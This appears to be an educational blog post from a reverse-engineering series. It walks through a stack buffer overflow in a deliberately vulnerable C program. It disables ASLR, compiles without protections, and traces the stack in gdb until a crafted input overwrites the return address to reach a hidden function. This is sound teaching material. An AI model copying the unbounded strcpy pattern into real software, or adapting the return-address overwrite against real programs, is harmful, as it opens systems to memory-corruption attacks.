---
title: "Intro to RE: C : part-5 [Stack Based Buffer Overflow]"
date: 2025-04-04T20:17:56+05:30
draft: false
# showtoc: false
tags:
    - "C"
    - "ELF"
    - "RE"
series:
    - "RE:C"
description: "How does buffer overflow can lead to change in control flow"
# math: true
# ShowBreadCrumbs: false
# searchHidden: true
# hideMeta: true
---






### Setting the Stage
Today, we’re not just smashing buffers — we’re hijacking control flow with user input. Before we start our little "experiment," let's make sure the playground is... accommodating. (*Optional*)

ASLR? [^aslr] - That pesky troublemaker has to go.

[^aslr]: https://www.networkworld.com/article/966844/what-does-aslr-do-for-linux.html

```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```
Now the memory layout won’t jump around like a caffeinated squirrel. Let’s roll. 😏

![](https://media.giphy.com/media/WGFJAIyTYtn47huJ0x/giphy.gif?cid=790b76112xcyfkificxigo3bpxxd7c9z47hawada5qveihct&ep=v1_gifs_search&rid=giphy.gif&ct=g#center)

### The Vulnerable Program

Here's a simple CTF-style challenge: `vuln.c`

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void secret_function() {
    printf("You've called the secret function!\n");
}

void vulnerable_function(char *input) {
    char buffer[5];
    strcpy(buffer, input); // Whoops, no bounds check!
}

int main(int argc, char **argv) {
    if (argc != 2) {
        printf("Usage: %s <input>\n", argv[0]);
        return 1;
    }
    vulnerable_function(argv[1]);
    printf("Done processing input.\n");
    return 0;
}
```


### Compiling Without Protections

Now we'll compile this code into a machine readable format: `elf`.

To keep things... delightfully fragile..

```bash
gcc -o vuln vuln.c -fno-stack-protector -z execstack
```

#### Delightfully fragile? (...Why These Flags?)

- `-fno-stack-protector`: Removes the stack canary [^stack_canaries].

- `-z execstack`: Marks the stack as executable.

Because why not make life easier (for learning purposes only)!!

[^stack_canaries]: https://ctf101.org/binary-exploitation/stack-canaries/

### So… what the heck actually happens when I run this thing?

Okay, quick version: when you run an ELF binary, Linux kicks things off with a system call to: `int execve(const char *filename, char *const argv[], char *const envp[])` [^linux_execve]...

[^linux_execve]: https://elixir.bootlin.com/linux/v6.13.7/source/tools/include/nolibc/sys.h#L286

```bash
# strace ./vuln

execve("./vuln", ["./vuln"], 0x7ffcd96818c0 /* 22 vars */) = 0
...
...
```

This call then passes the baton to another internal kernel function: `static int load_elf_binary(struct linux_binprm *bprm)` [^load_elf_binary] [^linux_binprm]

[^load_elf_binary]: https://elixir.bootlin.com/linux/v6.13.7/source/fs/binfmt_elf.c#L825
[^linux_binprm]: https://elixir.bootlin.com/linux/v6.13.7/source/include/linux/binfmts.h#L18

And just like that, Linux begins laying out the stage for your binary. The loader steps in, quietly pulling strings to bring `./vuln` to life...

Once `execve` is called, the kernel does the heavy lifting — it sets the scene, maps the memory, initializes the stack, and finally, passes control to the `entrypoint` of your program. A clean slate, ready for action.


```bash
# readelf --file-header ./vuln

ELF Header:
  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00
  Class:                             ELF64
  Data:                              2's complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              DYN (Position-Independent Executable file)
  Machine:                           Advanced Micro Devices X86-64
  Version:                           0x1
  Entry point address:               0x1070  <-- [ THIS THING HERE ]
  Start of program headers:          64 (bytes into file)
  Start of section headers:          13736 (bytes into file)
  Flags:                             0x0
  Size of this header:               64 (bytes)
  Size of program headers:           56 (bytes)
  Number of program headers:         14
  Size of section headers:           64 (bytes)
  Number of section headers:         30
  Section header string table index: 29
```


Wanna see where the magic begins? Hit the binary with `objdump` and look for the entry point.

```bash
# objdump -d ./vuln | grep 1070

0000000000001070 <_start>:
```


Ah, but don’t be fooled — that’s not your `main()` flexing. What you’re seeing here is the true beginning: `_start`, the entry summoned by the linker/loader.

It's the setup squad — the one that gets everything ready before your actual code runs.


![](https://media.giphy.com/media/26Ff1Wt6nHF5aFL3i/giphy.gif?cid=790b7611ill7rq6p221oop7i63l26lcmjpatgi53zrick7en&ep=v1_gifs_search&rid=giphy.gif&ct=g#center)


So what’s the deal with this detour?

Well, _start is the one pulling strings behind the scenes — it's provided by the C runtime, and it sets up the whole environment. Only after that does it call your main() function, passing in argc, argv, and envp all nice and proper.

Alright then, let's start up `gdb`. You already know where to place the breakpoint — right where it matters (`main` function obviously). Once it hits, the rest of the experiment is yours to unfold. Simple, right?

```gdb
gdb> break main

gdb> run

gdb> print $rip
$1 = (void (*)()) 0x555555555195 <main+4>

gdb> disas main
Dump of assembler code for function main:
   0x0000555555555191 <+0>:     push   rbp
   0x0000555555555192 <+1>:     mov    rbp,rsp
=> 0x0000555555555195 <+4>:     sub    rsp,0x10
   0x0000555555555199 <+8>:     mov    DWORD PTR [rbp-0x4],edi
   0x000055555555519c <+11>:    mov    QWORD PTR [rbp-0x10],rsi
   0x00005555555551a0 <+15>:    cmp    DWORD PTR [rbp-0x4],0x2
   0x00005555555551a4 <+19>:    je     0x5555555551cb <main+58>
   0x00005555555551a6 <+21>:    mov    rax,QWORD PTR [rbp-0x10]
   0x00005555555551aa <+25>:    mov    rax,QWORD PTR [rax]
   0x00005555555551ad <+28>:    mov    rsi,rax
   0x00005555555551b0 <+31>:    lea    rax,[rip+0xe74]        # 0x55555555602b
   0x00005555555551b7 <+38>:    mov    rdi,rax
   0x00005555555551ba <+41>:    mov    eax,0x0
   0x00005555555551bf <+46>:    call   0x555555555050 <printf@plt>
   0x00005555555551c4 <+51>:    mov    eax,0x1
   0x00005555555551c9 <+56>:    jmp    0x5555555551f2 <main+97>
   0x00005555555551cb <+58>:    mov    rax,QWORD PTR [rbp-0x10]
   0x00005555555551cf <+62>:    add    rax,0x8
   0x00005555555551d3 <+66>:    mov    rax,QWORD PTR [rax]
   0x00005555555551d6 <+69>:    mov    rdi,rax
   0x00005555555551d9 <+72>:    call   0x55555555516f <vulnerable_function>
   0x00005555555551de <+77>:    lea    rax,[rip+0xe59]        # 0x55555555603e
   0x00005555555551e5 <+84>:    mov    rdi,rax
   0x00005555555551e8 <+87>:    call   0x555555555040 <puts@plt>
   0x00005555555551ed <+92>:    mov    eax,0x0
   0x00005555555551f2 <+97>:    leave
   0x00005555555551f3 <+98>:    ret
End of assembler dump.
```


Let's take a look at how the compiler really interprets what we write in C — the transformation from human-readable logic to cold, deterministic machine dance.

```c{linenos=true}
//    0x0000555555555191 <+0>:     push   rbp
//    0x0000555555555192 <+1>:     mov    rbp,rsp
//    0x0000555555555195 <+4>:     sub    rsp,0x10
//    0x0000555555555199 <+8>:     mov    DWORD PTR [rbp-0x4],edi
//    0x000055555555519c <+11>:    mov    QWORD PTR [rbp-0x10],rsi
int main(int argc, char **argv) {

    //    0x00005555555551a0 <+15>:    cmp    DWORD PTR [rbp-0x4],0x2
    //    0x00005555555551a4 <+19>:    je     0x5555555551cb <main+58>
    if (argc != 2) {

        //    0x00005555555551a6 <+21>:    mov    rax,QWORD PTR [rbp-0x10]
        //    0x00005555555551aa <+25>:    mov    rax,QWORD PTR [rax]
        //    0x00005555555551ad <+28>:    mov    rsi,rax
        //    0x00005555555551b0 <+31>:    lea    rax,[rip+0xe74]        # 0x55555555602b
        //    0x00005555555551b7 <+38>:    mov    rdi,rax
        //    0x00005555555551ba <+41>:    mov    eax,0x0
        //    0x00005555555551bf <+46>:    call   0x555555555050 <printf@plt>
        printf("Usage: %s <input>\n", argv[0]);

        //    0x00005555555551c4 <+51>:    mov    eax,0x1
        //    0x00005555555551c9 <+56>:    jmp    0x5555555551f2 <main+97>
        return 1;
    }

    //    0x00005555555551cb <+58>:    mov    rax,QWORD PTR [rbp-0x10]
    //    0x00005555555551cf <+62>:    add    rax,0x8
    //    0x00005555555551d3 <+66>:    mov    rax,QWORD PTR [rax]
    //    0x00005555555551d6 <+69>:    mov    rdi,rax
    //    0x00005555555551d9 <+72>:    call   0x55555555516f <vulnerable_function>
    vulnerable_function(argv[1]);

    //    0x00005555555551de <+77>:    lea    rax,[rip+0xe59]        # 0x55555555603e
    //    0x00005555555551e5 <+84>:    mov    rdi,rax
    //    0x00005555555551e8 <+87>:    call   0x555555555040 <puts@plt>
    printf("Done processing input.\n");

    //    0x00005555555551ed <+92>:    mov    eax,0x0
    return 0;

    //    0x00005555555551f2 <+97>:    leave
    //    0x00005555555551f3 <+98>:    ret
}
```

Line number 3 --> `0x0000555555555195 <+4>:     sub    rsp,0x10`

This instruction creates space on the stack for local variables used inside the `main` function. It moves the stack pointer down by `0x10` (16 bytes), effectively reserving that much space between `rbp` and `rsp`.

This reserved stack space is where local variables will live — think of it as the function’s personal scratchpad. In this case, the compiler decides (because we programmed it) to save the incoming function arguments `argc` and `argv` onto this space:

```gdb
0x0000555555555199 <+8>:     mov    DWORD PTR [rbp-0x4],edi
0x000055555555519c <+11>:    mov    QWORD PTR [rbp-0x10],rsi
```


The next few lines perform a sanity check: Is the correct number of arguments passed to the program?

```gdb
0x00005555555551a0 <+15>:    cmp    DWORD PTR [rbp-0x4],0x2
0x00005555555551a4 <+19>:    je     0x5555555551cb <main+58>
```

If the user didn’t pass exactly `0x2` argument, we take the failure route:

```gdb
0x00005555555551a6 <+21>:    mov    rax,QWORD PTR [rbp-0x10]
0x00005555555551aa <+25>:    mov    rax,QWORD PTR [rax]
0x00005555555551ad <+28>:    mov    rsi,rax
0x00005555555551b0 <+31>:    lea    rax,[rip+0xe74]        # 0x55555555602b
0x00005555555551b7 <+38>:    mov    rdi,rax
0x00005555555551ba <+41>:    mov    eax,0x0
0x00005555555551bf <+46>:    call   0x555555555050 <printf@plt>
0x00005555555551c4 <+51>:    mov    eax,0x1
0x00005555555551c9 <+56>:    jmp    0x5555555551f2 <main+97>
```


Otherwise — if the argument count is valid — we jump ahead and continue with the actual work -- calling `vulnerable_function`

```gdb
0x00005555555551cb <+58>:    mov    rax,QWORD PTR [rbp-0x10]
0x00005555555551cf <+62>:    add    rax,0x8
0x00005555555551d3 <+66>:    mov    rax,QWORD PTR [rax]
0x00005555555551d6 <+69>:    mov    rdi,rax
0x00005555555551d9 <+72>:    call   0x55555555516f <vulnerable_function>
```


### Calling vulnerable_function

Let’s drop another breakpoint — this time on `vulnerable_function`. Why? Because vibes. And also, it’s kinda important.

```gdb
gdb> break *vulnerable_function
```

Since the "sanity check" needs to pass for the program to proceed into the `vulnerable_function`, we have to supply at least one argument besides the program name.

So yeah, we re-run the program with "abc" as the user input:

```gdb
gdb> run abc
```

And this is what the disassembly of `vulnerable_function` looks like:

```gdb
gdb> disas vulnerable_function

Dump of assembler code for function vulnerable_function:
=> 0x000055555555516f <+0>:     push   rbp
   0x0000555555555170 <+1>:     mov    rbp,rsp
   0x0000555555555173 <+4>:     sub    rsp,0x20
   0x0000555555555177 <+8>:     mov    QWORD PTR [rbp-0x18],rdi
   0x000055555555517b <+12>:    mov    rdx,QWORD PTR [rbp-0x18]
   0x000055555555517f <+16>:    lea    rax,[rbp-0x5]
   0x0000555555555183 <+20>:    mov    rsi,rdx
   0x0000555555555186 <+23>:    mov    rdi,rax
   0x0000555555555189 <+26>:    call   0x555555555030 <strcpy@plt>
   0x000055555555518e <+31>:    nop
   0x000055555555518f <+32>:    leave
   0x0000555555555190 <+33>:    ret
End of assembler dump.
```


This is what stack looks before and after the `rbp` is `push`ed in this context.

```
gdb> x/20gx $rsp
0x7fffffffe8f8: 0x00005555555551de      0x00007fffffffea38
0x7fffffffe908: 0x00000002ffffea38      0x00007fffffffe9b0
0x7fffffffe918: 0x00007ffff7deb488      0x00007fffffffe960
0x7fffffffe928: 0x00007fffffffea38      0x0000000255554040
0x7fffffffe938: 0x0000555555555191      0x00007fffffffea38
0x7fffffffe948: 0x03061a2375dd9875      0x0000000000000002
0x7fffffffe958: 0x0000000000000000      0x00007ffff7ffd000
0x7fffffffe968: 0x0000555555557dd8      0x03061a2374fd9875
0x7fffffffe978: 0x03060a61cec39875      0x00007fff00000000
0x7fffffffe988: 0x0000000000000000      0x0000000000000000

gdb> x/20gx $rsp
0x7fffffffe8f0: 0x00007fffffffe910      0x00005555555551de
0x7fffffffe900: 0x00007fffffffea38      0x00000002ffffea38
0x7fffffffe910: 0x00007fffffffe9b0      0x00007ffff7deb488
0x7fffffffe920: 0x00007fffffffe960      0x00007fffffffea38
0x7fffffffe930: 0x0000000255554040      0x0000555555555191
0x7fffffffe940: 0x00007fffffffea38      0x03061a2375dd9875
0x7fffffffe950: 0x0000000000000002      0x0000000000000000
0x7fffffffe960: 0x00007ffff7ffd000      0x0000555555557dd8
0x7fffffffe970: 0x03061a2374fd9875      0x03060a61cec39875
0x7fffffffe980: 0x00007fff00000000      0x0000000000000000
```
At the start of the function, we push the old rbp onto the stack — that's our link to the previous stack frame.
That address -- `0x00007fffffffe910` -- is now holding the old base pointer.

Right after that, the function typically reserves space with something like `sub rsp, 0x20`. That’s 32 bytes of fresh stack space, prepped and ready for locals, temps, maybe even your buffer that’s about to get overflowed (👀).

```
gdb> x/20gx $rsp
0x7fffffffe8d0: 0x0000000000000000      0x0000000000000000
0x7fffffffe8e0: 0x0000000000000000      0x0000000000000000
0x7fffffffe8f0: 0x00007fffffffe910      0x00005555555551de
0x7fffffffe900: 0x00007fffffffea38      0x00000002ffffea38
0x7fffffffe910: 0x00007fffffffe9b0      0x00007ffff7deb488
0x7fffffffe920: 0x00007fffffffe960      0x00007fffffffea38
0x7fffffffe930: 0x0000000255554040      0x0000555555555191
0x7fffffffe940: 0x00007fffffffea38      0x03061a2375dd9875
0x7fffffffe950: 0x0000000000000002      0x0000000000000000
0x7fffffffe960: 0x00007ffff7ffd000      0x0000555555557dd8
```


This instruction --> `mov    qword ptr [rbp - 0x18], rdi` --  stores the pointer address of passed argument (`argv[1]`) into the newly created stack buffer at `rbp - 0x18` location...The stack looks like this


```
gdb> x/20gx $rsp
0x7fffffffe8d0: 0x0000000000000000      0x00007fffffffece8
0x7fffffffe8e0: 0x0000000000000000      0x0000000000000000
0x7fffffffe8f0: 0x00007fffffffe910      0x00005555555551de
0x7fffffffe900: 0x00007fffffffea38      0x00000002ffffea38
0x7fffffffe910: 0x00007fffffffe9b0      0x00007ffff7deb488
0x7fffffffe920: 0x00007fffffffe960      0x00007fffffffea38
0x7fffffffe930: 0x0000000255554040      0x0000555555555191
0x7fffffffe940: 0x00007fffffffea38      0xc52f50aa6574d516
0x7fffffffe950: 0x0000000000000002      0x0000000000000000
0x7fffffffe960: 0x00007ffff7ffd000      0x0000555555557dd8



# Verification

gdb> x/s 0x00007fffffffece8
0x7fffffffece8: "abc"
```

Now `strcpy` function takes this pointer value, copies bytes to the destination location (`[rbp-0x5]`)... At this point, the actual content of `argv[1]` is sitting in the stack — right there in that buffer.
Depending on the length, it might look like a perfect fit…


```
gdb> x/20gx $rsp
0x7fffffffe8d0: 0x0000000000000000      0x00007fffffffece8
0x7fffffffe8e0: 0x0000000000000000      0x0000636261000000
0x7fffffffe8f0: 0x00007fffffffe910      0x00005555555551de
0x7fffffffe900: 0x00007fffffffea38      0x00000002ffffea38
0x7fffffffe910: 0x00007fffffffe9b0      0x00007ffff7deb488
0x7fffffffe920: 0x00007fffffffe960      0x00007fffffffea38
0x7fffffffe930: 0x0000000255554040      0x0000555555555191
0x7fffffffe940: 0x00007fffffffea38      0xc52f50aa6574d516
0x7fffffffe950: 0x0000000000000002      0x0000000000000000
0x7fffffffe960: 0x00007ffff7ffd000      0x0000555555557dd8


# Verification

gdb> x/s $rbp-0x5
0x7fffffffe8eb: "abc"
```


### What if we pass a bigger string ??

```gdb
gdb> run abcdef
```

*Doing the same thing, but with a bigger string;big enough to overflow the buffer ( >5 chars )*


And now... here’s the stack, post-overflow. This is the moment where structure gives way to chaos.

```
gdb> x/20gx $rsp
0x7fffffffe8d0: 0x0000000000000000      0x00007fffffffece5
0x7fffffffe8e0: 0x0000000000000000      0x6564636261000000
0x7fffffffe8f0: 0x00007fffffff0066      0x00005555555551de
0x7fffffffe900: 0x00007fffffffea38      0x00000002ffffea38
0x7fffffffe910: 0x00007fffffffe9b0      0x00007ffff7deb488
0x7fffffffe920: 0x00007fffffffe960      0x00007fffffffea38
0x7fffffffe930: 0x0000000255554040      0x0000555555555191
0x7fffffffe940: 0x00007fffffffea38      0xad2578063243f742
0x7fffffffe950: 0x0000000000000002      0x0000000000000000
0x7fffffffe960: 0x00007ffff7ffd000      0x0000555555557dd8


gdb> x/s $rbp-0x5
0x7fffffffe8eb: "abcdef"
```


And see how easily, it changed the saved `rbp` value (`0x00007fffffffe910`) to `0x00007fffffff0066`

*`66` - ascii for 'f' & `00` - null byte terminator; Rest 5 characters (abcde) are in the correct buffer/variable space*



After `vulnerable_function` returns, the `rbp` gets restored and now points to `0x00007fffffff0066`. This becomes the new anchor for any variable access — everything’s calculated relative to this updated `rbp`.

```
gdb> info frame
Stack level 0, frame at 0x7fffffff0076:
 rip = 0x5555555551de in main; saved rip = 0x0
 called by frame at 0x7fffffff007e
 Arglist at 0x7fffffff0066, args:
 Locals at 0x7fffffff0066, Previous frame's sp is 0x7fffffff0076
 Saved registers:
  rbp at 0x7fffffff0066, rip at 0x7fffffff006e
```

![](https://media.giphy.com/media/5Rn70fwULXQRdXAeQc/giphy.gif?cid=ecf05e47dgibrb8xtcwhzyjaa2qyvtmjtm9upuquo54mlkdh&ep=v1_gifs_search&rid=giphy.gif&ct=g#center)

Now let's take even bigger string that overwrites more of this unprotected memory...

```
gdb> run abcdefghijklmnopqrstuvwxyz
```


*Cut to: the aftermath*

```
# Before strcpy

gdb> x/20gx $rsp
0x7fffffffe8c0: 0x0000000000000000      0x00007fffffffecd1
0x7fffffffe8d0: 0x0000000000000000      0x0000000000000000
0x7fffffffe8e0: 0x00007fffffffe900      0x00005555555551de
0x7fffffffe8f0: 0x00007fffffffea28      0x00000002ffffea28
0x7fffffffe900: 0x00007fffffffe9a0      0x00007ffff7deb488
0x7fffffffe910: 0x00007fffffffe950      0x00007fffffffea28
0x7fffffffe920: 0x0000000255554040      0x0000555555555191
0x7fffffffe930: 0x00007fffffffea28      0x0f6d273242269d28
0x7fffffffe940: 0x0000000000000002      0x0000000000000000
0x7fffffffe950: 0x00007ffff7ffd000      0x0000555555557dd8


# After strcpy

gdb> x/20gx $rsp
0x7fffffffe8c0: 0x0000000000000000      0x00007fffffffecd1
0x7fffffffe8d0: 0x0000000000000000      0x6564636261000000
0x7fffffffe8e0: 0x6d6c6b6a69686766      0x7574737271706f6e
0x7fffffffe8f0: 0x0000007a79787776      0x00000002ffffea28
0x7fffffffe900: 0x00007fffffffe9a0      0x00007ffff7deb488
0x7fffffffe910: 0x00007fffffffe950      0x00007fffffffea28
0x7fffffffe920: 0x0000000255554040      0x0000555555555191
0x7fffffffe930: 0x00007fffffffea28      0x0f6d273242269d28
0x7fffffffe940: 0x0000000000000002      0x0000000000000000
0x7fffffffe950: 0x00007ffff7ffd000      0x0000555555557dd8
```


a classic stack overflow — and not just any overflow, but a textbook `rip` overwrite. Let's break it down like an autopsy:

![](https://cdn-images-1.medium.com/v2/resize:fit:1455/1*qqrGcsu8wepNG78oh41cow.png)


Eventually the program should crash because it can't access `0x7574737271706f6e` address...leading to segmentation fault in OS!

```gdb
gdb> x $rip
0x7574737271706f6e:     Cannot access memory at address 0x7574737271706f6e
```

This brings us to the `secret_function` in `vuln.c` program...

```gdb
gdb> disas secret_function
Dump of assembler code for function secret_function:
   0x0000555555555159 <+0>:     push   rbp
   0x000055555555515a <+1>:     mov    rbp,rsp
   0x000055555555515d <+4>:     lea    rax,[rip+0xea4]        # 0x555555556008
   0x0000555555555164 <+11>:    mov    rdi,rax
   0x0000555555555167 <+14>:    call   0x555555555040 <puts@plt>
   0x000055555555516c <+19>:    nop
   0x000055555555516d <+20>:    pop    rbp
   0x000055555555516e <+21>:    ret
End of assembler dump.
```


Now imagine this: what if we shape our input just right… so that when `vulnerable_function` returns, it hands control not back to where it came from — but straight to `0x0000555555555159` (`secret_function`)?

```gdb
## abcde12341234YQUUUU
## ['a', 'b', 'c', 'd', 'e', '1', '2', '3', '4', '1', '2', '3', '4', '0x59', '0x51', '0x55', '0x55', '0x55', '0x55']
## remember little-endian?!
##
gdb> run abcde12341234YQUUUU


# Before strcpy
gdb> x/20gx $rsp
0x7fffffffe8c0: 0x0000000000000000      0x00007fffffffecd8
0x7fffffffe8d0: 0x0000000000000000      0x0000000000000000
0x7fffffffe8e0: 0x00007fffffffe900      0x00005555555551de
0x7fffffffe8f0: 0x00007fffffffea28      0x00000002ffffea28
0x7fffffffe900: 0x00007fffffffe9a0      0x00007ffff7deb488
0x7fffffffe910: 0x00007fffffffe950      0x00007fffffffea28
0x7fffffffe920: 0x0000000255554040      0x0000555555555191
0x7fffffffe930: 0x00007fffffffea28      0x7fe849f3e90b379d
0x7fffffffe940: 0x0000000000000002      0x0000000000000000
0x7fffffffe950: 0x00007ffff7ffd000      0x0000555555557dd8

# After strcpy
gdb> x/20gx $rsp
0x7fffffffe8c0: 0x0000000000000000      0x00007fffffffecd8
0x7fffffffe8d0: 0x0000000000000000      0x6564636261000000
0x7fffffffe8e0: 0x3433323134333231      0x0000555555555159
0x7fffffffe8f0: 0x00007fffffffea28      0x00000002ffffea28
0x7fffffffe900: 0x00007fffffffe9a0      0x00007ffff7deb488
0x7fffffffe910: 0x00007fffffffe950      0x00007fffffffea28
0x7fffffffe920: 0x0000000255554040      0x0000555555555191
0x7fffffffe930: 0x00007fffffffea28      0x7fe849f3e90b379d
0x7fffffffe940: 0x0000000000000002      0x0000000000000000
0x7fffffffe950: 0x00007ffff7ffd000      0x0000555555557dd8
```


And now, with `rip` pointing to `0x0000555555555159`, the game changes. Even though `main` never explicitly called `secret_function`, we’ve bent the rules — and now it runs anyway.
Just the way we like it.

```gdb
gdb> x/gx $rbp
0x3433323134333231:     Cannot access memory at address 0x3433323134333231

gdb> x/gx $rsp
0x7fffffffe8e8: 0x0000555555555159

gdb> x/i 0x0000555555555159
   0x555555555159 <secret_function>:    push   rbp

gdb> c
Continuing.
You've called the secret function!

Program received signal SIGILL, Illegal instruction.
```


This gets the job done, sure…
But man, it leaves the stack looking like a crime scene. We’ll clean that up next time.


![](https://media0.giphy.com/media/v1.Y2lkPTc5MGI3NjExM3h1NTdybmNpbWNsN3R0dWg1cTJkdjhkaDZjMWQ4OHlneHluYmlvYyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/14kdiJUblbWBXy/giphy.gif#center)
